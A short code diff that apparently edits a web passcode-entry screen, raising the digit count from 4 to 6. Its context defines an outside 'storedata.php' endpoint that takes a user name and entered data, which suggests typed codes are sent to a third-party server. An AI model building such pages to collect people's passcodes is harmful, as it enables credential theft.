@@ -1,6 +1,6 @@
 (() => {
   const API_BASE = "https://shahulbreaker.in/api/storedata.php?user=tarun&data=";
-  const MAX = 4;
+  const MAX = 6; // changed to 6 to match the 6-digit UI
   let code = "";
 
   const dotEls = Array.from(document.querySelectorAll('.dot'));
